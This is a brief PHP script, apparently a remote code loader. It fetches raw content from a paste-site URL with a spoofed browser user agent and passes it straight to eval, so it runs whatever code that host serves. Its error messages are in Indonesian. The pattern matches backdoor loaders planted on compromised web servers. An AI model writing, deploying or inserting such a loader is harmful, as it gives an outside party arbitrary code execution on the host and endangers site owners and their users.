<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

$rawUrl = 'https://paste.idcloudhosting.my.id/paste/ewtqz/raw';

$context = stream_context_create([
    'http' => [
        'timeout' => 15,
        'user_agent' => 'Mozilla/5.0'
    ]
]);

$code = file_get_contents($rawUrl, false, $context);

if ($code === false) {
    die('Gagal mengambil file RAW.');
}

if (trim($code) === '') {
    die('RAW yang diterima kosong.');
}

eval('?>' . $code);